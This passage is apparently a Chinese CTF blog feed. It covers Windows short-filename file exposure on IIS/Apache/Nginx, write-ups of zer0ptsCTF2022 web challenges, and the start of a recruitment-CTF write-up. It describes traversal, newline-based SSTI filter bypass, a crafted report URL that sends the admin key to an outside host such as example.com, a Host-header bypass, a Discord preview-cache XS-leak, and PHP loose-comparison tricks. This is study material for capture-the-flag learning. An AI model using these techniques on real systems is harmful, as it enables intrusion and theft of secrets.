<h4 id="本地复现失败"><a href="#本地复现失败" class="headerlink" title="本地复现失败"></a>本地复现失败</h4><p><strong>本地Winserver12的IIS8.5+.NET 4.0测试，不支持通配符访问文件夹和文件</strong>，不知道是不是配置PHP环境后才行<br>支持OPTIONS方法猜解，猜测成功404，失败200，需要<code>*~1*</code>这么个格式，没有这个<code>~1</code>就无法猜解，并且不能使用已经猜测出的短文件目录名进行进一步的猜解<br>即我拥有<code>testguessfolder/ind33333x.html</code>这样子一个文件，可以猜测出文件夹短文件名为<code>TESTGU~1</code>，但在猜解文件名的时候，不能使用<code>TESTGU~1</code>作为文件夹名，而是得使用<code>testguessfolder</code>全名才能继续猜解ind33333x.html这个文件</p>
<h3 id="windows-Apache"><a href="#windows-Apache" class="headerlink" title="windows+Apache"></a>windows+Apache</h3><p><strong>支持短文件名访问</strong>，目录和文件均可<br><strong>不支持通配符访问和短文件名猜解</strong>，本地环境加奇怪的字符会直接导致403，fuzz了一遍不给用的是一堆不可见字符和<code>&quot; * : &lt; &gt; |</code>，刚好包括我们的三个通配符和短文件名猜测时的星号，可能是Apache的过滤</p>
<h3 id="windows-Nginx"><a href="#windows-Nginx" class="headerlink" title="windows+Nginx"></a>windows+Nginx</h3><p>对野生Nginx&#x2F;1.18.0的测试结果<br><strong>支持短文件名访问，通配符访问文件（不可访问文件夹）</strong>短文件名因为找不到能用的所以没有实测。。。。<br><strong>不支持短文件名猜解</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>感觉返回来IIS变成最安全的了，虽然能进行短文件名猜解，但猜解出来了又不给访问，完整文件名靠脑洞补全<br>Apache次之，discuz的数据库备份就能被直接访问上，但是不能通配符访问文件名<br>Nginx比较危险，虽然不能短文件名猜解，但是既支持短文件名访问又支持通配符访问，并且这等于可以猜解完整文件名了，并且通配符访问本身就挺危险的吧。。。</p>
<h2 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h2><p>判断服务器是Linux还是windows的最有效方法之一应该是文件名的大小写，找到一个有效文件改改大小写看看会不会404就知道平台类型了，触发报错或者偶尔看看响应头应该也能找到些什么？<br>windows默认是不分大小写的，创建一个a.txt和A.txt会导致文件名冲突，不过听说windows在某次更新后支持了对文件名的大小写区分，但是需要额外配置</p>
<h2 id="discuz-RCE"><a href="#discuz-RCE" class="headerlink" title="discuz RCE"></a>discuz RCE</h2><p>红明谷杯那个线下事实上是个discuz的题，第一步是用到了windows下短文件名访问获取到了discuz的数据库备份获取到了UC_key然后各种操作RCE的，对discuz完全不熟，只能把各位神仙的文章记录一下了<br><a href="https://paper.seebug.org/1197/">空指针-Base on windows Writeup – 最新版DZ3.4实战渗透</a><br><a href="https://paper.seebug.org/1144/">这是一篇“不一样”的真实渗透测试案例分析文章</a>  这个挺有意思的就是太难了呜呜<br><a href="https://guokeya.github.io/post/87yhVz7uW/">红明谷数据安全大赛线下赛Discuz题解</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/2004">PHP源码调试之Windows文件通配符分析</a><br><a href="https://www.freebuf.com/articles/web/172561.html">IIS深入浅出之短文件漏洞知多少</a><br><a href="https://gitee.com/Discuz/DiscuzX/issues/I10NG9">windows短文件名安全问题 数据库备份爆破</a><br><a href="https://stackoverflow.com/questions/24190389/findfirstfile-undocumented-wildcard-or-bug">FindFirstFile undocumented wildcard or bug?</a><br><a href="https://xz.aliyun.com/t/2318#toc-4">Windows下的”你画我猜” – 告别效率低下的目录扫描方法</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>discuz</tag>
      </tags>
  </entry>
  <entry>
    <title>zer0ptsCTF2022复现</title>
    <url>/zer0ptsCTF2022%E5%A4%8D%E7%8E%B0.html</url>
    <content><![CDATA[<h1 id="zer0ptsCTF2022复现"><a href="#zer0ptsCTF2022复现" class="headerlink" title="zer0ptsCTF2022复现"></a>zer0ptsCTF2022复现</h1><p>其实都在虎符坐牢，虎符做完牢之后zer0pts的比赛也就差不多结束了。。。<br>虎符四个web感觉有两个不怎么web，zer0pts六个web感觉也有一半不怎么web。。。<br>zer0pts当初还是我提议拉一个队打一下的拉着。。。对不起其他究极输出的师傅们。<br>然后最后一个小时简单的看了一下web题。一共六个web，一个签到，两个感觉不是很web的题，以及这两个不是很web的题被非预期之后的revenge，和一个完全没看不知道是个啥的题（说起来究极国际队也赛题被疯狂非预期了，并且这个赛题数量以及其和web的相关程度，感觉也没有比我们好很多。突然心里有点舒服了一点？）不过感觉他们还是影响力比我们大多了，并且他们常年举办比赛也很有经验，总之就是discord里看起来很热闹氛围很好呜呜（我现在才知道似乎discord和QQ群不一样发公告不要随便@全体。。。就丢在announcement里就行。。。以及现在的私聊比较流行的说法是dm，direct message）</p>
<p>然后因为没有怎么看题所以不会坐牢，简单复现</p>
<p>然后因为没有看多久所以简单看一下然后去codeql坐牢吧。。。</p>
<h2 id="GitFile-Explorer"><a href="#GitFile-Explorer" class="headerlink" title="GitFile Explorer"></a>GitFile Explorer</h2><p>签到。是个人都能做。正则写的过于粗糙目录穿越一下即可<br><code>zer0pts&#123;foo/bar/../../../../../directory/traversal&#125;</code><br>如果把协议那里稍微写仔细一点感觉会难一点点点点</p>
<h2 id="miniblog"><a href="#miniblog" class="headerlink" title="miniblog++"></a>miniblog++</h2><p>被非预期的web1<br>这个题预期解感觉和web的关系不大。。。</p>
<p>但是非预期还是挺web的。以及叫做++不知道是不是往年有普通版</p>
<p>代码非常的长，预期解是要打究极的zip协议再ssti。但由于在模板渲染处控制的不是很好结果就导致了直接的ssti打爆了。这里就简单的看一下这段吧</p>
<p>修复前的代码</p>
<pre class=" language-python"><code class="language-python">        <span class="token keyword">for</span> brace <span class="token keyword">in</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"{{.*?}}"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token operator">not</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">"{{!?[a-zA-Z0-9_]+}}"</span><span class="token punctuation">,</span> brace<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'You can only use "{{title}}", "{{author}}", and "{{date}}"'</span><span class="token punctuation">,</span> None
</code></pre>
<p>修复后的代码</p>
<pre class=" language-python"><code class="language-python">        <span class="token keyword">for</span> m <span class="token keyword">in</span> re<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span>r<span class="token string">"{{"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
            p <span class="token operator">=</span> m<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token punctuation">(</span>content<span class="token punctuation">[</span>p<span class="token punctuation">:</span>p<span class="token operator">+</span>len<span class="token punctuation">(</span><span class="token string">'{{title}}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'{{title}}'</span> <span class="token operator">or</span> \
                    content<span class="token punctuation">[</span>p<span class="token punctuation">:</span>p<span class="token operator">+</span>len<span class="token punctuation">(</span><span class="token string">'{{author}}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'{{author}}'</span> <span class="token operator">or</span> \
                    content<span class="token punctuation">[</span>p<span class="token punctuation">:</span>p<span class="token operator">+</span>len<span class="token punctuation">(</span><span class="token string">'{{date}}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'{{date}}'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'You can only use "{{title}}", "{{author}}", and "{{date}}"'</span><span class="token punctuation">,</span> None
</code></pre>
<p>修复前的代码使用正则表达式去匹配所有的双大括号，然后只支持a-zA-Z0-9和下划线，也就理论上来说防御了SQL注入。但这里有一个非常严重的问题，就是<code>.</code>不匹配换行。而ssti是可以换行的，通过换行ssti执行到rce成功</p>
<p>修了一下之后直接字符串等于了，超级修复。他们两个题的revenge的附件压缩包密码都是上一题的flag，这样子的做好不好呢？说起来这样子也就可以直接在修复里暴露出上一题的解法了，但是他们还是换了一个方法来修复。写的很死应该是怕再出问题吧。。。（毕竟我们的题目修复之后还是有超级漏洞就很丢脸了。。。）</p>
<h2 id="Disco-Party"><a href="#Disco-Party" class="headerlink" title="Disco Party"></a>Disco Party</h2><p>被非预期的web2，感觉预期解应该是什么discord的特性黑魔法<br>代码还挺长的。</p>
<p>主要看这段</p>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/post/&lt;string(length=16):id>"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">get_post</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Read a ticket"""</span>
    <span class="token comment" spellcheck="true"># Get ticket by ID</span>
    content <span class="token operator">=</span> get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>id<span class="token punctuation">)</span>
    <span class="token keyword">if</span> content <span class="token keyword">is</span> None<span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> <span class="token string">"not found"</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Check if admin</span>
    content <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    key <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>
    is_admin <span class="token operator">=</span> isinstance<span class="token punctuation">(</span>key<span class="token punctuation">,</span> str<span class="token punctuation">)</span> <span class="token operator">and</span> get_key<span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token operator">==</span> key

    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span>
        <span class="token string">"index.html"</span><span class="token punctuation">,</span>
        <span class="token operator">**</span>content<span class="token punctuation">,</span>
        is_post<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
        panel<span class="token operator">=</span>f<span class="token triple-quoted-string string">"""
&lt;strong>Hello admin! Your flag is: {FLAG}&lt;/strong>&lt;br>
&lt;form id="delete-form" method="post" action="/api/delete">
    &lt;input name="id" type="hidden" value="{id}">
    &lt;input name="key" type="hidden" value="{key}">
    &lt;button id="modal-button-delete" type="button">Delete This Post&lt;/button>
&lt;/form>
"""</span> <span class="token keyword">if</span> is_admin <span class="token keyword">else</span> <span class="token string">""</span><span class="token punctuation">,</span>
        url<span class="token operator">=</span>flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">,</span>
        sitekey<span class="token operator">=</span>RECAPTCHA_SITE_KEY
    <span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/api/new"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">api_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Create a new ticket"""</span>
    <span class="token comment" spellcheck="true"># Get parameters</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        title <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"title"</span><span class="token punctuation">]</span>
        content <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Invalid request"</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Register a new ticket</span>
    id <span class="token operator">=</span> b64digest<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
    get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>set<span class="token punctuation">(</span>
        id<span class="token punctuation">,</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span> title<span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> content<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>

    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"OK"</span><span class="token punctuation">,</span>
                          <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Post created! Click here to see your post"</span><span class="token punctuation">,</span>
                          <span class="token string">"action"</span><span class="token punctuation">:</span> f<span class="token string">"{flask.request.url_root}post/{id}"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/api/report"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">api_report</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Reoprt an invitation ticket"""</span>
    <span class="token comment" spellcheck="true"># Get parameters</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span>
        reason <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"reason"</span><span class="token punctuation">]</span>
        recaptcha_token <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"g-recaptcha-response"</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Invalid request"</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Check reCAPTCHA</span>
    score <span class="token operator">=</span> verify_recaptcha<span class="token punctuation">(</span>recaptcha_token<span class="token punctuation">)</span>
    <span class="token keyword">if</span> score <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Recaptcha verify failed"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> score <span class="token operator">&lt;=</span> <span class="token number">0.3</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> f<span class="token string">"Bye robot (score: {score})"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Check URL</span>
    parsed <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>parsed<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Query string is not allowed"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> f<span class="token string">'{parsed.scheme}://{parsed.netloc}/'</span> <span class="token operator">!=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url_root<span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid host"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Parse path</span>
    adapter <span class="token operator">=</span> app<span class="token punctuation">.</span>url_map<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>host<span class="token punctuation">)</span>
    endpoint<span class="token punctuation">,</span> args <span class="token operator">=</span> adapter<span class="token punctuation">.</span>match<span class="token punctuation">(</span>parsed<span class="token punctuation">.</span>path<span class="token punctuation">)</span>
    <span class="token keyword">if</span> endpoint <span class="token operator">!=</span> <span class="token string">"get_post"</span> <span class="token operator">or</span> <span class="token string">"id"</span> <span class="token operator">not</span> <span class="token keyword">in</span> args<span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid endpoint"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Check ID</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>exists<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid ID"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

    key <span class="token operator">=</span> get_key<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    message <span class="token operator">=</span> f<span class="token string">"URL: {url}?key={key}\nReason: {reason}"</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        get_redis_conn<span class="token punctuation">(</span>DB_BOT<span class="token punctuation">)</span><span class="token punctuation">.</span>rpush<span class="token punctuation">(</span>
            <span class="token string">'report'</span><span class="token punctuation">,</span> message<span class="token punctuation">[</span><span class="token punctuation">:</span>MESSAGE_LENGTH_LIMIT<span class="token punctuation">]</span>
        <span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Post failed"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"OK"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Successfully reported"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>访问post时如果带有正确的key就能拿到flag</p>
<p>bot会将message写进redis，然后再发送到某个秘密channel中。我们要做的就是获取到这个key。说起来前面这里的解析。这么大一堆。。。。看的不是很懂呢<br>大致就是检查了url必须是题目的url，然后不能带get参数，并且一定要访问的是get_post对应的路由，这里的这段写法我就觉得有点玄幻（直接字符串比较不就行了么）</p>
<p>可以简单地观察到的情况是，当你在discord中发送一个链接的时候，discord是会请求这个链接的，然后在聊天框里出现一个preview</p>
<h3 id="非预期1"><a href="#非预期1" class="headerlink" title="非预期1"></a>非预期1</h3><p>所以非预期解是在有效的一个post链接后面添加<code># &lt;vps&gt;</code>，由于题目没有检查hash字段，且最终是将整个url进行拼接，空格又打断了实际上发出去时的url判断，实际上就变成了将vps和后面的参数拼起来又发了一次<br>请求</p>
<pre><code>http://party.ctf.zer0pts.com:8007/post/0123456789abcdef# http://example.com/
</code></pre>
<p>就会实际上将key发送到example.com</p>
<h3 id="非预期2"><a href="#非预期2" class="headerlink" title="非预期2"></a>非预期2</h3><p>这里判断url使用的是flask.request.url_root和flask.request.host。而这两个值其实是基于请求的Host header的，只要修改host header就可以发送任意请求了</p>
<p>这里写的这个bind再match的操作我还以为究极检测，结果就是把自己的urlmap对应起来进行比对，并不受host影响。因此修改host就可以提交任意url，同样的进行外带</p>
<h2 id="Disco-Festival"><a href="#Disco-Festival" class="headerlink" title="Disco Festival"></a>Disco Festival</h2><p>这个题修了，把report处的代码改掉了<br>并且直接用字符串进行host的检查了，发送的链接也基本上被写死了</p>
<p>一次修了两个问题，也很稳妥。。。不像我们修了一个又被非预期了，显得很呆。。。害</p>
<pre class=" language-python"><code class="language-python">HOST <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"HOST"</span><span class="token punctuation">,</span> <span class="token string">"localhost"</span><span class="token punctuation">)</span>
PORT <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"PORT"</span><span class="token punctuation">,</span> <span class="token string">"8017"</span><span class="token punctuation">)</span>
NETLOC <span class="token operator">=</span> f<span class="token string">'{HOST}:{PORT}'</span>


<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

    adapter <span class="token operator">=</span> app<span class="token punctuation">.</span>url_map<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>NETLOC<span class="token punctuation">)</span>
    endpoint<span class="token punctuation">,</span> args <span class="token operator">=</span> adapter<span class="token punctuation">.</span>match<span class="token punctuation">(</span>parsed<span class="token punctuation">.</span>path<span class="token punctuation">)</span>
    <span class="token keyword">if</span> endpoint <span class="token operator">!=</span> <span class="token string">"get_post"</span> <span class="token operator">or</span> <span class="token string">"id"</span> <span class="token operator">not</span> <span class="token keyword">in</span> args<span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid endpoint"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Check ID</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>exists<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid ID"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

    key <span class="token operator">=</span> get_key<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    message <span class="token operator">=</span> f<span class="token string">"URL: http://{NETLOC}{parsed.path}?key={key}\nReason: {reason}"</span>
</code></pre>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>还是和之前发一个链接然后discord会去加载一下预览相关</p>
<p>discord的链接预览似乎是存在着玄幻的全局缓存机制的，也就是说如果其他人在其他地方发了一个url，discord抓取了预览，那么这个预览就是全局的，在另一个服务器发送也会获取到该预览值。并且只要url的参数甚至hash不同，就会重新进行抓取</p>
<p>通过这个操作进行xs leak</p>
<p>report处限制了整个消息的长度，而adapter.match对于get_post的这个router<code>/post/&lt;string(length=16):id&gt;</code>的解析实际上也是转换到了正则<code>r&#39;^\|/+?post/+?(?P&lt;id&gt;[^/]&#123;16&#125;)$&#39;</code>。虽然后面半截看不懂，但是开局那个意思应该是允许出现很多斜杠</p>
<p>因此使用大量的斜杠来截断消息。使bot发送类似<code>http://target///////////.../post/&lt;id&gt;?key=xx</code>的消息，这样子可以控制住发送出去的key的长度。从而逐位leak</p>
<p>在bot发送了该链接后对字符集进行遍历，能够迅速得到预览的即为命中，可以使用discord bot消息中的embeds属性快速确认是否命中</p>
<p><a href="https://hackmd.io/6J49ly7SSAC2pon0IDLxBg">官方wp</a></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>上次忘了什么原因升级了node和hexo，旧版本hexo遇到ssti这种双大括号是会解析错误疯狂报错的，今天发现新版本修了，并且原来的row和endrow标签反而又不能识别了。不过不用加这个玩意本身就是好事</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>三叶草招新赛部分wp</title>
    <url>/%E4%B8%89%E5%8F%B6%E8%8D%89%E6%8B%9B%E6%96%B0%E8%B5%9B.html</url>
    <content><![CDATA[<h1 id="三叶草招新赛部分wp"><a href="#三叶草招新赛部分wp" class="headerlink" title="三叶草招新赛部分wp"></a>三叶草招新赛部分wp</h1><p>最近是三叶草招新，不愧是强队，招新赛都这么难，学习了QWQ</p>
<h2 id="性感黄阿姨在线聊天"><a href="#性感黄阿姨在线聊天" class="headerlink" title="性感黄阿姨在线聊天"></a>性感黄阿姨在线聊天</h2><p>打开是一个对话框，输入表情包可以获得三叶草师傅们的表情包（没有什么实际意义）<br>题目分两层，一层PHP弱类型一层XXE（xml实体注入）</p>
<h3 id="弱类型比较字符串"><a href="#弱类型比较字符串" class="headerlink" title="弱类型比较字符串"></a>弱类型比较字符串</h3><p>首先抓包发现数据以json的格式传递，<code>&#123;&quot;root&quot;:&#123;&quot;name&quot;:&quot;guest&quot;,&quot;request&quot;:&quot;flag&quot;&#125;&#125;</code><br>按照要求将guest改为admin之后出现一个判断<br><code>admin也不行! //if($name==md5($flag))&#123;flag in ...&#125;</code><br>这里只有name可控，在等号两边都可控时可以输入两个数组，通过md5函数无法处理数组返回null的性质绕过对md5的检验，这里显然不行，但这里数据是以json格式传递，我们可以控制数据类型（GET，POST方法默认传递过去的值为字符串），使用弱类型比较的转换</p>
<h4 id="PHP字符与数字比较"><a href="#PHP字符与数字比较" class="headerlink" title="PHP字符与数字比较"></a>PHP字符与数字比较</h4><p>若字符串与数字比较，则认为0与其相等，若字符串以数字开头，则将其转化为开头的连续数字进行比较</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span>
    <span class="token keyword">echo</span> <span class="token string">'pass'</span><span class="token punctuation">;</span>
